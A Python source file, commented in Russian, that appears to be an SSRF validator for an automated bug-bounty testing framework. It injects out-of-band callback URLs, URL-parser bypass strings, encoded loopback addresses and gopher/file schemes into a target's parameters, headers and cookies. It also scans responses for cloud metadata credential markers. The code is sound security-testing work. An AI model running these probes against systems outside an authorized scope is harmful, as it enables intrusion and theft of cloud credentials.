"""SSRF — OOB callback + multi-vector, replays, target-parity, body-exfil.

Расширенный контракт v1.1 (после code-review):

1.  **Мульти-инжекция**: candidate.method + meta["content_type"] +
    meta["header_params"] + meta["extra_fields"] + meta["injection_point"]
    (query/body/header/cookie/path) — не только GET+query, как в v1.
2.  **Мульти-схема**: http/https по умолчанию, http/https/gopher/file если
    meta["extended_schemes"]. Схема идёт в oob-URL и в отдельные попытки.
3.  **Redirect-probe**: meta["redirector_template"] = "http://red.example/r?to={oob}"
    — сервер идёт на редиректор, тот 302 → OOB. Один из самых частых
    векторов на bug-bounty.
4.  **URL-parser bypass probes**: userinfo (`http://tok.oob@127.0.0.1/`),
    null-byte (`%00`), tab (`%09`), backslash (`\\@`) — обходят слабые
    allowlist-фильтры.
5.  **IPv6/hex/oct/decimal/short internal-IP probes** — альтернативные
    представления 127.0.0.1, отсылаются как отдельные попытки; результат
    ищется в теле (body-exfiltration) или через callback (если сервер
    делает DNS до fetch).
6.  **Replays**: до _MAX_ATTEMPTS попыток с новым token'ом на каждой (DNS
    callback может прийти через 15-20с, HTTP callback может потеряться —
    один запрос ловит не всё).
7.  **Ранний FAIL при target-reject**: если *все* пробные запросы вернули
    статус вне _SUCCESS_STATUS, а callback'а нет — reason
    `target_rejected_request`, не ждём OOB зря.
8.  **Body-exfiltration**: сервер вернул ответ, содержащий OOB-token или
    IMDS-маркеры (`ami-id`, `iam/security-credentials`, `Metadata-Flavor`) —
    это не blind SSRF, а reflected: PASS даже без OOB callback.
9.  **IMDS-fingerprint**: callback от `169.254.169.254`,
    `metadata.google.internal`, `100.100.100.200` и т.п. → CRITICAL,
    confidence 0.99 (утечка облачных credentials — top-severity).
10. **source_ip classification**: сравниваем IP callback'а с DNS
    таргета и классифицируем (loopback/link_local/private/public);
    служит слоем evidence для судьи M3.
11. **DNS + public resolver = needs_proof** (не FAIL). Callback был, просто
    резолвер публичный (Google/Cloudflare) — SSRF мог быть, но
    доказательство слабое, нужно повторить с приватного OAST.
12. **callback без token в hostname = LOW-tier PASS** (conf 0.30,
    needs_proof=True). Реальный callback от цели существует, просто
    hostname нормализовался — не FAIL, а сигнал для консенсуса.
13. **wait_s по умолчанию 30с** (было 12с). DNS-callback'у часто нужно
    больше 15с из-за резолвер-кэшей.
14. **payload_false реально отсылается** (baseline probe с 127.0.0.1:1),
    метрики попадают в артефакты — контракт BaseValidator (TRUE/FALSE
    должны быть отправлены).
15. **Опечатка** `urllparse_hostname` → `_urlparse_hostname`; старое имя
    сохранено как alias, чтобы не сломать импорты.

Инвариант: никаких исключений наружу — обёрнуто в `Verdict` через
`as_failure()`.  Никаких внешних зависимостей: httpx + stdlib.
"""

from __future__ import annotations

import contextlib
import ipaddress
import socket
import time
import urllib.parse
from typing import Any

import httpx

from orchestrator.types import Candidate, ValidatorContext, Verdict
from tools.core.vulnerability_class import VulnerabilityClass
from tools.validators import registry
from tools.validators.base import (
    BaseValidator,
    PayloadVariant,
    ValidationEvidence,
    check_scope,
)

_NAME = "ssrf_oob_v1"

# HTTP-семейство «сервер принял запрос».
_SUCCESS_STATUS = frozenset(
    {200, 201, 202, 203, 204, 206, 301, 302, 303, 304, 307, 308}
)

# IMDS endpoints — попадание туда критично (утечка cloud creds).
_IMDS_HOSTS = frozenset(
    {
        "169.254.169.254",  # AWS / OpenStack / DigitalOcean / Azure
        "metadata.google.internal",  # GCP
        "metadata.goog",
        "fd00:ec2::254",  # AWS IPv6 IMDS
        "100.100.100.200",  # Aliyun
    }
)

# Маркеры IMDS в body-ответе (для body-exfiltration через reflected SSRF).
_IMDS_BODY_MARKERS: tuple[bytes, ...] = (
    b"ami-id",
    b"instance-identity",
    b"iam/security-credentials",
    b"AccessKeyId",
    b"SecretAccessKey",
    b"Metadata-Flavor",
    b"computeMetadata",
    b"instance/service-accounts",
    b"aws-internal",
    b"security-credentials/",
)

# Схемы для перебора (Баг 2).
_DEFAULT_SCHEMES: tuple[str, ...] = ("http", "https")
_EXTENDED_SCHEMES: tuple[str, ...] = ("http", "https", "gopher", "file")

# Confidences.
_CONF_HTTP_CALLBACK = 0.95
_CONF_HTTP_CALLBACK_IMDS = 0.99
_CONF_BODY_EXFIL = 0.90
_CONF_DNS_NON_PUBLIC = 0.65
_CONF_LOW_CALLBACK = 0.30  # weak — public DNS or callback without token in host

# Тайминги (Баг 13).
_DEFAULT_WAIT_S = 30.0
_MAX_ATTEMPTS = 3

# Baseline «FALSE» payload — заведомо не резолвится в интернете (Баг 10).
_FALSE_PAYLOAD = "http://127.0.0.1:1/probe"

# Приоритеты reason'ов — на случай если несколько попыток дают РАЗНЫЕ
# «сигналы» (одна public DNS, другая просто no_callback): показать в
# итоговом Verdict наиболее информативный. is_real=True всегда выигрывает
# is_real=False (см. логику ниже) — эта таблица только для FAIL-случаев
# и для выбора среди is_real=True с одинаковым confidence.
_REASON_PRIORITY: dict[str, int] = {
    "http_callback_imds": 999,
    "http_callback_confirmed": 950,
    "body_exfiltration_oob_token": 900,
    "body_exfiltration_imds_markers": 890,
    "dns_only_callback": 650,
    "callback_without_token_in_hostname": 300,
    "dns_only_public_resolver": 200,
    "dns_only_unknown_resolver": 150,
    "target_rejected_request": 100,
    "no_oob_callback": 0,
}


# ─── helpers ─────────────────────────────────────────────────────────────────


def _urlparse_hostname(url: str) -> str:
    """Возвращает hostname из URL (lower-case). Пустая строка если нет."""
    try:
        return (urllib.parse.urlparse(url).hostname or "").lower()
    except Exception:
        return ""


# Backwards-compat alias — старое имя с опечаткой (Баг 9).
urllparse_hostname = _urlparse_hostname


def _hostname_matches_token(hostname: str, token: str, oob_domain: str) -> bool:
    if not hostname or not token or not oob_domain:
        return False
    exact = f"{token}.{oob_domain}".lower()
    host_l = hostname.lower()
    return host_l == exact or host_l.endswith(f".{exact}")


def _is_imds_hostname(hostname: str) -> bool:
    if not hostname:
        return False
    h = hostname.lower()
    if h in _IMDS_HOSTS:
        return True
    if h.startswith("[") and h.endswith("]"):
        return h.strip("[]") in _IMDS_HOSTS
    return False


def _body_imds_markers(body: bytes) -> list[str]:
    if not body:
        return []
    return [m.decode("ascii", errors="replace") for m in _IMDS_BODY_MARKERS if m in body]


def _classify_source_ip(source_ip: str) -> str:
    """loopback/link_local/private/public/unknown — для source_ip callback'а."""
    if not source_ip:
        return "unknown"
    try:
        ip = ipaddress.ip_address(source_ip.strip("[]"))
    except (ValueError, TypeError):
        return "unknown"
    if ip.is_loopback:
        return "loopback"
    if ip.is_link_local:
        return "link_local"
    if ip.is_private:
        return "private"
    return "public"


def _resolve_target_ip(target: str) -> str | None:
    """A-record IP таргета (для сравнения с source_ip callback'а). Без сети — None."""
    try:
        host = _urlparse_hostname(target) or target
        return socket.gethostbyname(host)
    except (OSError, socket.gaierror):
        return None


def _oob_domain_from(hostname: str, token: str) -> str:
    """Отрезает `<token>.` из hostname — остаётся зона OAST-сервера."""
    if hostname and hostname.lower().startswith(f"{token.lower()}."):
        return hostname[len(token) + 1 :]
    return hostname or ""


def _make_url_variants(
    oob_url: str, oob_hostname: str, schemes: tuple[str, ...]
) -> list[tuple[str, str]]:
    """Возвращает [(variant_name, url)] — пробы для одной ветки token'а.

    Включает:
      • канонические схемы (http/https/gopher/file по конфигу);
      • URL-parser bypass'ы (userinfo/null-byte/tab/backslash — Проблема 11);
      • internal-IP variants (127.0.0.1 в oct/hex/decimal/short/[::1] — Проблема 12),
        которые используют oob как ссылку на probe — если сервер отражает
        ответ, увидим OOB-hostname в теле.
    """
    parsed = urllib.parse.urlparse(oob_url)
    path = parsed.path or "/"
    port = f":{parsed.port}" if parsed.port else ""

    variants: list[tuple[str, str]] = []

    # 1. Канонические схемы.
    for scheme in schemes:
        variants.append((f"scheme_{scheme}", f"{scheme}://{oob_hostname}{port}{path}"))

    # 2. URL-parser bypasses (userinfo / null-byte / tab / backslash).
    # Все несут OOB-hostname — если сервер криво парсит и всё-таки резолвит
    # правильную часть, придёт callback.
    variants.extend(
        [
            ("bypass_userinfo", f"http://{oob_hostname}@127.0.0.1{port}{path}"),
            ("bypass_null_byte", f"http://{oob_hostname}%00@127.0.0.1{port}{path}"),
            ("bypass_backslash", f"http://{oob_hostname}\\@127.0.0.1{port}{path}"),
            ("bypass_tab", f"http://127.0.0.1%09{oob_hostname}{port}{path}"),
        ]
    )

    # 3. Internal-IP variants — альтернативные представления 127.0.0.1 как host.
    # Успех виден через body-exfiltration (сервер вернёт тело localhost).
    for name, repr_ in (
        ("ip_ipv6_loopback", "[::1]"),
        ("ip_ipv4_hex", "0x7f000001"),
        ("ip_ipv4_decimal", "2130706433"),
        ("ip_ipv4_short", "127.1"),
        ("ip_ipv4_octal", "0177.0.0.1"),
    ):
        variants.append((name, f"http://{repr_}{path}?probe={oob_hostname}"))

    return variants


def _poll_safe(oob: Any, token: str, wait_s: float) -> list[dict[str, Any]]:
    """Обёртка над oob.poll — никогда не бросает наружу."""
    try:
        hits = oob.poll(token, wait_s) or []
        return list(hits)
    except Exception:
        return []


def _first_success_status(attempts: list[dict[str, Any]]) -> int | None:
    for a in attempts:
        for v in a.get("variant_results", []):
            s = v.get("status")
            if s is not None and int(s) in _SUCCESS_STATUS:
                return int(s)
    for a in attempts:
        for v in a.get("variant_results", []):
            s = v.get("status")
            if s is not None:
                return int(s)
    return None


def _first_success_len(attempts: list[dict[str, Any]]) -> int | None:
    for a in attempts:
        for v in a.get("variant_results", []):
            if v.get("status") is not None and int(v["status"]) in _SUCCESS_STATUS:
                return int(v.get("len") or 0)
    return None


# ─── validator ───────────────────────────────────────────────────────────────


@registry.register(VulnerabilityClass.SSRF)
class SSRFValidator(BaseValidator):
    """SSRF: OOB callback / body-exfil / IMDS / мульти-вектор с replays."""

    @property
    def name(self) -> str:
        return _NAME

    @property
    def vulnerability_class(self) -> VulnerabilityClass:
        return VulnerabilityClass.SSRF

    def generate_payload(self, variant: PayloadVariant) -> str:
        # TRUE-плейсхолдер: реальный URL строится в validate() с OOB-token.
        return "http://<oob-url-placeholder>/probe" if variant == "true" else _FALSE_PAYLOAD

    def compare_responses(self, resp_true: Any, resp_false: Any) -> bool:
        if not (isinstance(resp_true, dict) and isinstance(resp_false, dict)):
            return False
        return bool(resp_true.get("oob_hits") or resp_true.get("body_exfil"))

    # ------------------------------------------------------------------ main
    def validate(self, candidate: Candidate, ctx: ValidatorContext) -> Verdict:
        try:
            oos = check_scope(ctx, candidate.target)
            if oos == "out_of_scope":
                return self._out_of_scope_verdict(candidate.target)

            if ctx.oob is None:
                return Verdict(
                    is_real=False,
                    evidence="SSRF требует ctx.oob (OOBProvider с new_token/poll)",
                    confidence=0.0,
                    bug_class=self.vulnerability_class.value,
                    validator=self.name,
                    reason="oob_not_configured",
                )

            transport = ctx.extra.get("http_transport") if ctx.extra else None
            wait_s = float(ctx.poll_wait_s or _DEFAULT_WAIT_S)
            replays_total = max(
                1, min(int(getattr(ctx, "replays", 1) or 1), _MAX_ATTEMPTS)
            )

            meta = candidate.meta if isinstance(candidate.meta, dict) else {}
            schemes: tuple[str, ...] = (
                _EXTENDED_SCHEMES if meta.get("extended_schemes") else _DEFAULT_SCHEMES
            )
            redirector_tpl = meta.get("redirector_template") or None

            target_ip = _resolve_target_ip(candidate.target)

            # Baseline FALSE probe (Баг 10) — реально отсылаем, а не только
            # сохраняем в артефактах.
            false_probe = self._send_target(candidate, ctx, transport, _FALSE_PAYLOAD)

            aggregated: dict[str, Any] = {
                "attempts": [],
                "best_reason": "no_oob_callback",
                "best_confidence": 0.0,
                "best_is_real": False,
                "best_callback_type": "none",
                "best_hit": {},
                "best_token": "",
                "best_oob_url": "",
                "best_oob_hostname": "",
                "best_oob_domain": "",
                "needs_proof": False,
                "body_exfil": False,
                "imds_fingerprint": False,
                "imds_body_markers": [],
                "target_all_rejected": True,
                "tokens_used": [],
                "raw_hits_total": 0,
                "valid_hits_total": 0,
            }

            with httpx.Client(
                transport=transport,
                timeout=10.0,
                verify=ctx.tls_verify,
                follow_redirects=False,
            ) as client:
                for attempt_idx in range(replays_total):
                    probe_id = f"ssrf-{candidate.id}-{attempt_idx + 1}"
                    token, oob_url = ctx.oob.new_token(probe_id)
                    token = str(token)
                    oob_url = str(oob_url)
                    oob_hostname = _urlparse_hostname(oob_url)
                    oob_domain = _oob_domain_from(oob_hostname, token)
                    aggregated["tokens_used"].append(token)

                    variants = _make_url_variants(oob_url, oob_hostname, schemes)
                    if redirector_tpl and "{oob}" in redirector_tpl:
                        with contextlib.suppress(KeyError, IndexError):
                            variants.append(
                                ("redirect_probe", redirector_tpl.format(oob=oob_url))
                            )

                    variant_results: list[dict[str, Any]] = []
                    saw_success_status = False
                    body_exfil_where: str | None = None
                    body_imds_where: str | None = None
                    body_imds_markers_local: list[str] = []

                    for variant_name, payload_value in variants:
                        probe = self._send_with_client(
                            client, candidate, ctx, payload_value
                        )
                        variant_results.append(
                            {
                                "variant": variant_name,
                                "payload": payload_value,
                                "status": probe["status"],
                                "len": probe["len"],
                                "error": probe.get("error"),
                            }
                        )
                        if (
                            probe["status"] is not None
                            and probe["status"] in _SUCCESS_STATUS
                        ):
                            saw_success_status = True
                            body = probe.get("body") or b""
                            if token.encode("ascii", errors="replace") in body:
                                body_exfil_where = body_exfil_where or variant_name
                            markers = _body_imds_markers(body)
                            if markers and not body_imds_where:
                                body_imds_where = variant_name
                                body_imds_markers_local = markers

                    # ── poll OOB ──
                    poll_start = time.monotonic()
                    hits = _poll_safe(ctx.oob, token, wait_s)
                    waited_ms = round((time.monotonic() - poll_start) * 1000.0, 3)

                    valid_hits: list[dict[str, Any]] = []
                    invalid_hits: list[dict[str, Any]] = []
                    for h in hits:
                        if not isinstance(h, dict):
                            continue
                        host = str(h.get("hostname") or "")
                        if _hostname_matches_token(host, token, oob_domain):
                            valid_hits.append(h)
                        else:
                            invalid_hits.append(h)

                    http_hits = [
                        h for h in valid_hits if str(h.get("type", "")).lower() == "http"
                    ]
                    dns_hits = [
                        h for h in valid_hits if str(h.get("type", "")).lower() == "dns"
                    ]

                    # ── judge this attempt ──
                    attempt_is_real = False
                    attempt_conf = 0.0
                    attempt_reason = "no_oob_callback"
                    attempt_callback_type = "none"
                    attempt_hit: dict[str, Any] = {}
                    attempt_needs_proof = False
                    attempt_imds = False

                    if http_hits:
                        attempt_hit = http_hits[0]
                        attempt_callback_type = "http"
                        callback_host = str(attempt_hit.get("hostname", ""))
                        callback_src = str(attempt_hit.get("source_ip", ""))
                        # IMDS-fingerprint: либо hostname был IMDS-endpoint'ом
                        # (редко: сервер вернул host именно так), либо callback
                        # пришёл с source_ip IMDS (после server-side redirect
                        # на 169.254.169.254 и последующего запроса на OOB).
                        if _is_imds_hostname(callback_host) or _is_imds_hostname(
                            callback_src
                        ):
                            attempt_is_real = True
                            attempt_conf = _CONF_HTTP_CALLBACK_IMDS
                            attempt_reason = "http_callback_imds"
                            attempt_imds = True
                        else:
                            attempt_is_real = True
                            attempt_conf = _CONF_HTTP_CALLBACK
                            attempt_reason = "http_callback_confirmed"
                    elif body_exfil_where:
                        attempt_callback_type = "body_exfil"
                        attempt_is_real = True
                        attempt_conf = _CONF_BODY_EXFIL
                        attempt_reason = "body_exfiltration_oob_token"
                        attempt_hit = {
                            "hostname": "",
                            "type": "body_exfil",
                            "path": body_exfil_where,
                        }
                    elif body_imds_where:
                        attempt_callback_type = "body_exfil"
                        attempt_is_real = True
                        attempt_conf = _CONF_BODY_EXFIL
                        attempt_reason = "body_exfiltration_imds_markers"
                        attempt_imds = True
                        attempt_hit = {
                            "hostname": "",
                            "type": "body_exfil_imds",
                            "path": body_imds_where,
                        }
                    elif dns_hits:
                        attempt_hit = dns_hits[0]
                        attempt_callback_type = "dns"
                        resolver_type = str(
                            attempt_hit.get("resolver_type", "unknown")
                        ).lower()
                        if resolver_type == "non_public":
                            attempt_is_real = True
                            attempt_conf = _CONF_DNS_NON_PUBLIC
                            attempt_reason = "dns_only_callback"
                        elif resolver_type == "public":
                            # Проблема 4: not FAIL — needs_proof.
                            attempt_reason = "dns_only_public_resolver"
                            attempt_needs_proof = True
                        else:
                            attempt_reason = "dns_only_unknown_resolver"
                            attempt_needs_proof = True
                    elif invalid_hits and not valid_hits:
                        # Проблема 5: LOW-tier PASS, needs_proof.
                        attempt_callback_type = "http"
                        attempt_hit = invalid_hits[0]
                        attempt_is_real = True
                        attempt_conf = _CONF_LOW_CALLBACK
                        attempt_reason = "callback_without_token_in_hostname"
                        attempt_needs_proof = True
                    elif not saw_success_status:
                        # Проблема 7: target отверг всё — не ждём дальше.
                        attempt_reason = "target_rejected_request"

                    # Классификация source_ip (Проблема 14).
                    src_ip = (
                        str(attempt_hit.get("source_ip", "")) if attempt_hit else ""
                    )
                    src_ip_class = _classify_source_ip(src_ip)
                    src_ip_matches_target = bool(
                        src_ip and target_ip and src_ip.split("%")[0] == target_ip
                    )

                    aggregated["attempts"].append(
                        {
                            "attempt": attempt_idx + 1,
                            "token": token,
                            "oob_url": oob_url,
                            "variants_sent": [
                                v["variant"] for v in variant_results
                            ],
                            "variant_results": variant_results,
                            "hits_raw": len(hits),
                            "hits_valid": len(valid_hits),
                            "hits_invalid_hostname": len(invalid_hits),
                            "callback_type": attempt_callback_type,
                            "reason": attempt_reason,
                            "is_real": attempt_is_real,
                            "confidence": attempt_conf,
                            "needs_proof": attempt_needs_proof,
                            "imds": attempt_imds,
                            "callback_hostname": str(
                                attempt_hit.get("hostname", "")
                            )
                            if attempt_hit
                            else "",
                            "callback_path": str(attempt_hit.get("path", ""))
                            if attempt_hit
                            else "",
                            "callback_source_ip": src_ip,
                            "callback_source_ip_class": src_ip_class,
                            "callback_source_ip_matches_target": src_ip_matches_target,
                            "resolver_type": str(
                                attempt_hit.get("resolver_type", "unknown")
                            )
                            if attempt_hit
                            else "unknown",
                            "waited_ms": waited_ms,
                            "saw_success_status": saw_success_status,
                            "body_exfil_where": body_exfil_where,
                            "body_imds_where": body_imds_where,
                            "body_imds_markers": body_imds_markers_local,
                        }
                    )

                    aggregated["raw_hits_total"] += len(hits)
                    aggregated["valid_hits_total"] += len(valid_hits)
                    if saw_success_status:
                        aggregated["target_all_rejected"] = False
                    if body_exfil_where:
                        aggregated["body_exfil"] = True
                    if attempt_imds:
                        aggregated["imds_fingerprint"] = True
                        aggregated["imds_body_markers"] = (
                            body_imds_markers_local or aggregated["imds_body_markers"]
                        )
                    if attempt_needs_proof:
                        aggregated["needs_proof"] = True

                    # Upgrade «best»?  is_real=True всегда бьёт False;
                    # среди одинакового is_real сравниваем сначала confidence,
                    # затем reason-priority (FAIL-случаи выбираются по priority).
                    cur_prio = _REASON_PRIORITY.get(
                        str(aggregated["best_reason"]), 0
                    )
                    new_prio = _REASON_PRIORITY.get(attempt_reason, 0)
                    same_realness = attempt_is_real == aggregated["best_is_real"]
                    conf_higher = attempt_conf > aggregated["best_confidence"]
                    conf_equal_prio_higher = (
                        attempt_conf == aggregated["best_confidence"]
                        and new_prio > cur_prio
                    )
                    upgrade = (
                        attempt_is_real and not aggregated["best_is_real"]
                    ) or (same_realness and (conf_higher or conf_equal_prio_higher))
                    if upgrade:
                        aggregated["best_reason"] = attempt_reason
                        aggregated["best_confidence"] = attempt_conf
                        aggregated["best_is_real"] = attempt_is_real
                        aggregated["best_callback_type"] = attempt_callback_type
                        aggregated["best_hit"] = attempt_hit
                        aggregated["best_token"] = token
                        aggregated["best_oob_url"] = oob_url
                        aggregated["best_oob_hostname"] = oob_hostname
                        aggregated["best_oob_domain"] = oob_domain

                    # Ранний выход: сильное PASS-подтверждение.
                    if attempt_is_real and attempt_conf >= _CONF_HTTP_CALLBACK:
                        break
                    # Ранний выход: target отверг всё И нет hits — retry не поможет.
                    if not saw_success_status and not hits:
                        break

            # ── final verdict ──
            is_real = bool(aggregated["best_is_real"])
            confidence = float(aggregated["best_confidence"])
            reason = str(aggregated["best_reason"])
            callback_type = str(aggregated["best_callback_type"])
            best_hit = aggregated["best_hit"] or {}
            token_final = str(aggregated["best_token"]) or (
                aggregated["tokens_used"][0] if aggregated["tokens_used"] else ""
            )

            # Если ни одна попытка не PASSED и target отверг всё → уточняем reason.
            if not is_real and aggregated["target_all_rejected"]:
                reason = "target_rejected_request"

            replays_passed = sum(
                1 for a in aggregated["attempts"] if a["is_real"]
            )

            ev = ValidationEvidence(
                payload_true=aggregated["best_oob_url"] or "http://<oob-url>/probe",
                payload_false=_FALSE_PAYLOAD,
                status_true=int(_first_success_status(aggregated["attempts"]) or 0),
                status_false=int(false_probe["status"] or 0),
                len_true=int(_first_success_len(aggregated["attempts"]) or 0),
                len_false=int(false_probe["len"] or 0),
                sha256_true=ValidationEvidence.sha256_of(b""),
                sha256_false=ValidationEvidence.sha256_of(
                    false_probe.get("body") or b""
                ),
                timing_ms_true=0.0,
                timing_ms_false=float(false_probe.get("timing_ms") or 0.0),
                oob_hit=is_real and callback_type != "none",
                oob_token=token_final,
                extra={
                    "callback_type": callback_type,
                    "callback_hostname": str(best_hit.get("hostname", "")),
                    "callback_path": str(best_hit.get("path", "")),
                    "callback_source_ip": str(best_hit.get("source_ip", "")),
                    "callback_source_ip_class": _classify_source_ip(
                        str(best_hit.get("source_ip", ""))
                    ),
                    "resolver_type": str(best_hit.get("resolver_type", "unknown")),
                    "attempts": len(aggregated["attempts"]),
                    "raw_hits_count": aggregated["raw_hits_total"],
                    "valid_hits_count": aggregated["valid_hits_total"],
                    "target_all_rejected": aggregated["target_all_rejected"],
                    "target_ip_resolved": target_ip,
                    "needs_proof": aggregated["needs_proof"],
                    "body_exfil": aggregated["body_exfil"],
                    "imds_fingerprint": aggregated["imds_fingerprint"],
                    "imds_body_markers": aggregated["imds_body_markers"],
                    "schemes_tried": list(schemes),
                    "redirector_probed": bool(redirector_tpl),
                    "false_probe_status": int(false_probe["status"] or 0),
                    "false_probe_error": false_probe.get("error"),
                    "oob_hostname": aggregated["best_oob_hostname"],
                    "oob_domain": aggregated["best_oob_domain"],
                    "request_url_sent": aggregated["best_oob_url"],
                    "request_status": _first_success_status(aggregated["attempts"]),
                    "waited_ms": sum(
                        float(a.get("waited_ms") or 0.0)
                        for a in aggregated["attempts"]
                    ),
                    "per_attempt": aggregated["attempts"],
                },
            )

            evidence_text = (
                f"SSRF: attempts={len(aggregated['attempts'])}, "
                f"callback_type={callback_type}, "
                f"raw_hits={aggregated['raw_hits_total']}, "
                f"valid_hits={aggregated['valid_hits_total']}, "
                f"reason={reason}"
            )
            if aggregated["imds_fingerprint"]:
                evidence_text += " [IMDS]"
            if aggregated["body_exfil"]:
                evidence_text += " [body-exfil]"
            if aggregated["needs_proof"] and not is_real:
                evidence_text += " [needs_proof]"

            return Verdict(
                is_real=is_real,
                evidence=evidence_text,
                confidence=confidence,
                bug_class=self.vulnerability_class.value,
                validator=self.name,
                reason=reason,
                replays_passed=replays_passed,
                replays_total=len(aggregated["attempts"]) or 1,
                artifacts=ev.to_dict(),
            )
        except Exception as e:
            return self.as_failure(e)

    # ─── HTTP send helpers ──────────────────────────────────────────────
    def _send_target(
        self,
        candidate: Candidate,
        ctx: ValidatorContext,
        transport: Any,
        payload_url: str,
    ) -> dict[str, Any]:
        """Разовый httpx.Client — используется для baseline FALSE probe."""
        with httpx.Client(
            transport=transport,
            timeout=10.0,
            verify=ctx.tls_verify,
            follow_redirects=False,
        ) as client:
            return self._send_with_client(client, candidate, ctx, payload_url)

    def _send_with_client(
        self,
        client: httpx.Client,
        candidate: Candidate,
        ctx: ValidatorContext,
        payload_url: str,
    ) -> dict[str, Any]:
        """Отправить payload_url как значение в выбранный injection-point.

        Читает candidate.method + meta:
          • injection_point ∈ {"query","body","header","cookie","path"}
          • content_type ∈ {"form","json"} — для body
          • header_name, cookie_name — для соотв. точек
          • extra_fields (dict) — доп. поля body/query
          • header_params (dict) — доп. заголовки
        """
        meta = candidate.meta if isinstance(candidate.meta, dict) else {}
        base = ctx.target.rstrip("/")
        path = candidate.path or "/"
        method = (candidate.method or "GET").upper()
        param = candidate.param or "url"
        injection_point = str(meta.get("injection_point", "query")).lower()
        content_type = str(meta.get("content_type", "form")).lower()
        header_name = str(meta.get("header_name", "X-Forwarded-For"))
        cookie_name = str(meta.get("cookie_name", "url"))

        headers: dict[str, str] = {
            **(ctx.program_headers or {}),
            **(candidate.headers or {}),
        }
        header_params = meta.get("header_params")
        if isinstance(header_params, dict):
            for k, v in header_params.items():
                headers[str(k)] = str(v)

        extra_fields_raw = meta.get("extra_fields")
        extra_fields = extra_fields_raw if isinstance(extra_fields_raw, dict) else {}

        url = base + path
        params: dict[str, str] = {}
        json_body: Any = None
        data_body: dict[str, str] | None = None
        cookies: dict[str, str] = {}
        request_error: str | None = None

        if injection_point == "header":
            headers[header_name] = payload_url
            for k, v in extra_fields.items():
                params[str(k)] = str(v)
        elif injection_point == "cookie":
            cookies[cookie_name] = payload_url
            for k, v in extra_fields.items():
                params[str(k)] = str(v)
        elif injection_point == "path":
            url = base + path.rstrip("/") + "/" + urllib.parse.quote(payload_url, safe="")
        elif injection_point == "body":
            if content_type == "json":
                json_body = {
                    param: payload_url,
                    **{str(k): v for k, v in extra_fields.items()},
                }
            else:
                data_body = {
                    param: payload_url,
                    **{str(k): str(v) for k, v in extra_fields.items()},
                }
        else:  # "query" default
            params[param] = payload_url
            for k, v in extra_fields.items():
                params[str(k)] = str(v)

        start = time.monotonic()
        resp = None
        try:
            if method == "GET" and injection_point == "body":
                # GET с телом — редкость: переводим на POST.
                resp = client.request(
                    "POST",
                    url,
                    params=params or None,
                    headers=headers or None,
                    cookies=cookies or None,
                    json=json_body,
                    data=data_body,
                )
            elif method == "GET":
                resp = client.get(
                    url,
                    params=params or None,
                    headers=headers or None,
                    cookies=cookies or None,
                )
            else:
                resp = client.request(
                    method,
                    url,
                    params=params or None,
                    headers=headers or None,
                    cookies=cookies or None,
                    json=json_body,
                    data=data_body,
                )
        except Exception as req_e:
            request_error = f"{type(req_e).__name__}: {req_e}"

        elapsed_ms = round((time.monotonic() - start) * 1000.0, 3)
        if resp is None:
            return {
                "status": None,
                "body": b"",
                "len": 0,
                "timing_ms": elapsed_ms,
                "error": request_error,
            }
        body = resp.content or b""
        return {
            "status": int(resp.status_code),
            "body": body,
            "len": len(body),
            "timing_ms": elapsed_ms,
            "error": None,
        }
